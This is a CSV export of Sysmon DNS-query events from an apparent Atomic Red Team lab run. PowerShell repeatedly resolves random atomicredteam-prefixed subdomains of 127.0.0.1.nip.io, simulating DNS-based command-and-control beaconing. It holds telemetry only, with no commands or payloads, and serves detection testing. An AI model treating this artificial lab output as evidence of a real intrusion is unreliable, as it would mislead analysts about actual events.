"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174629,"Query: atomicredteam-506934.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.185","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174630,"Query: atomicredteam-918659.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.226","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174631,"Query: atomicredteam-589864.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.264","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174632,"Query: atomicredteam-779578.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.302","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174633,"Query: atomicredteam-789444.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174634,"Query: atomicredteam-46462.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.518","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:31.728 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174635,"Query: atomicredteam-253380.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.555","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174636,"Query: atomicredteam-98124.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.724","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174637,"Query: atomicredteam-462284.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.761","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174638,"Query: atomicredteam-745110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.800","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174639,"Query: atomicredteam-327798.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.837","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174640,"Query: atomicredteam-192662.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.874","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174641,"Query: atomicredteam-980111.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.912","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174642,"Query: atomicredteam-685107.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:31.966","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174643,"Query: atomicredteam-177689.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.004","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174644,"Query: atomicredteam-468987.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.042","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174645,"Query: atomicredteam-689296.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.079","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174646,"Query: atomicredteam-611300.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.117","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174647,"Query: atomicredteam-161728.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.155","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174648,"Query: atomicredteam-869337.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.192","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174649,"Query: atomicredteam-119412.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.230","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174650,"Query: atomicredteam-751386.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.268","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174651,"Query: atomicredteam-240724.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.305","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:32.740 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174652,"Query: atomicredteam-100446.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.342","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174653,"Query: atomicredteam-815497.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.381","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174654,"Query: atomicredteam-451272.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174655,"Query: atomicredteam-628745.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.597","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174656,"Query: atomicredteam-888452.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.770","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174657,"Query: atomicredteam-322095.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.809","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174658,"Query: atomicredteam-948094.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.848","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174659,"Query: atomicredteam-482816.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.885","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174660,"Query: atomicredteam-951418.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.937","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174661,"Query: atomicredteam-697612.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:32.975","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174662,"Query: atomicredteam-268688.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.014","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174663,"Query: atomicredteam-621772.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174664,"Query: atomicredteam-882118.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.092","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174665,"Query: atomicredteam-570180.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.259","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174666,"Query: atomicredteam-51398.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.298","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174667,"Query: atomicredteam-478466.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.336","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174668,"Query: atomicredteam-271296.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.375","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174669,"Query: atomicredteam-628337.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.414","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174670,"Query: atomicredteam-145112.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.452","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.753 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174671,"Query: atomicredteam-338769.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.491","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.754 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174672,"Query: atomicredteam-339427.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.529","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:33.754 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174673,"Query: atomicredteam-192870.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.566","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174674,"Query: atomicredteam-31799.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.894","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174675,"Query: atomicredteam-584295.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.937","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:34.768 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174676,"Query: atomicredteam-359312.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:33.975","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
